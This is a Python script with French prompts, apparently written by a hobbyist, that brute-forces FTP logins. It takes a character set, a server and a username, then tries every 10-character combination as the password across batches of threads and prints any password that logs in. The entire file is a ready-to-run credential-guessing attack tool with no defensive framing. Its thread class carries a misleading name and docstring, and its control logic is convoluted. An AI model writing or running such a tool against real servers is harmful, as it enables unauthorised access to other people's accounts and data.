import ftplib
from ftplib import FTP
from itertools import product
from random import randint
import random
import sys
from threading import Thread
import time

print (" ##################################### ")
print (" #                                   # ")
print (" #                                   # ")
print (" #       Scipt dévellopé par:        # ")
print (" #          Alexandre Baux           # ")
print (" #                                   # ")
print (" #                                   # ")
print (" ##################################### ")

chars = input("Quels caractères voulez-vous mettre? : ")
print ("Caractères mis: ", chars)
server = input("Quel est votre serveur? : ")
print ("Votre serveur est: ", server)
ide = input("Quel est votre identifiant? : ")
print ("Votre identifiant est: ", ide)
print ("la connexion se fera à: ", ide, "@", server)
caca = ""
num = "1"

class Afficheur(Thread):

    """Thread chargé simplement d'afficher une lettre dans la console."""

    def __init__(self, lettre):
        Thread.__init__(self)
        self.lettre = lettre

    def run(self):
        try:
            ftp = FTP()
            ftp.connect(server)
            ftp.login(ide, self.lettre)
            print ("[*] found pass :")
            print (self.lettre)
            sys.exit()
            sys.exit(0)
            ftp.quit()
            
        except ftplib.error_perm:  
            cacaaaaaaa = 1

for length in range(10, 11): # le deuxieme il faut faire +1
    to_attempt = product(chars, repeat=length)
    for attempt in to_attempt:
        print(''.join(attempt))
        if num == "21":
            num = "1"
            thread_11.join()
            print ("thread 11 arete")
            thread_12.join()
            print ("thread 12 arreté")
            thread_13.join()
            print ("thread 13 arreté")
            thread_14.join()
            print ("thread 14 arreté")
            thread_15.join()
            print ("thread 15 arreté")
            thread_16.join()
            print ("thread 16 arete")
            thread_17.join()
            print ("thread 17 arreté")
            thread_18.join()
            print ("thread 18 arreté")
            thread_19.join()
            print ("thread 19 arreté")
            thread_20.join()
            print ("thread 20 arreté")
        if num == "20":
            thread_20 = Afficheur(''.join(attempt))
            num = "21"
            thread_20.start()
            print ("tread 20 démaré")
        if num == "19":
            thread_19 = Afficheur(''.join(attempt))
            num = "20"
            thread_19.start()
            print ("tread 19 démaré")
        if num == "18":
            thread_18 = Afficheur(''.join(attempt))
            num = "19"
            thread_18.start()
            print ("tread 18 démaré")
        if num == "17":
            thread_17 = Afficheur(''.join(attempt))
            num = "18"
            thread_17.start()
            print ("tread 17 démaré")
        if num == "16":
            thread_16 = Afficheur(''.join(attempt))
            num = "17"
            thread_16.start()
            print ("tread 16 démaré")
        if num == "15":
            thread_15 = Afficheur(''.join(attempt))
            num = "16"
            thread_15.start()
            print ("tread 15 démaré")
        if num == "14":
            thread_14 = Afficheur(''.join(attempt))
            num = "15"
            thread_14.start()
            print ("tread 14 démaré")
        if num == "13":
            thread_13 = Afficheur(''.join(attempt))
            num = "14"
            thread_13.start()
            print ("tread 13 démaré")
        if num == "12":
            thread_12 = Afficheur(''.join(attempt))
            num = "13"
            thread_12.start()
            print ("tread 12 démaré")
        if num == "11":
            thread_11 = Afficheur(''.join(attempt))
            num = "12"
            thread_11.start()
            print ("tread 11 démaré")
        if num == "10":
            thread_10= Afficheur(''.join(attempt))
            num = "11"
            thread_10.start()
            print ("thread 10 démarré")
            thread_1.join()
            print ("thread 1 arete")
            thread_2.join()
            print ("thread 2 arreté")
            thread_3.join()
            print ("thread 3 arreté")
            thread_4.join()
            print ("thread 4 arreté")
            thread_5.join()
            print ("thread 5 arreté")
            thread_6.join()
            print ("thread 6 arete")
            thread_7.join()
            print ("thread 7 arreté")
            thread_8.join()
            print ("thread 8 arreté")
            thread_9.join()
            print ("thread 9 arreté")
            thread_10.join()
            print ("thread 10 arreté")
        if num == "9":
            thread_9= Afficheur(''.join(attempt))
            num = "10"
            thread_9.start()
            print ("tread 9 démaré")
        if num == "8":
            thread_8 = Afficheur(''.join(attempt))
            num = "9"
            thread_8.start()
            print ("tread 8 démaré")
        if num == "7":
            thread_7 = Afficheur(''.join(attempt))
            num = "8"
            thread_7.start()
            print ("tread 7 démaré")
        if num == "6":
            thread_6 = Afficheur(''.join(attempt))
            num = "7"
            thread_6.start()
            print ("tread 6 démaré")
        if num == "5":
            thread_5 = Afficheur(''.join(attempt))
            num = "6"
            thread_5.start()
            print ("tread 5 démaré")
        if num == "4":
            thread_4 = Afficheur(''.join(attempt))
            num = "5"
            thread_4.start()
            print ("tread 4 démaré")
        if num == "3":
            thread_3 = Afficheur(''.join(attempt))
            num = "4"
            thread_3.start()
            print ("tread 3 démaré")
        if num == "2":
            thread_2 = Afficheur(''.join(attempt))
            num = "3"
            thread_2.start()
            print ("tread 2 démaré")
        if num == "1":
            thread_1 = Afficheur(''.join(attempt))
            num = "2"
            thread_1.start()
            print ("tread 1 démaré")



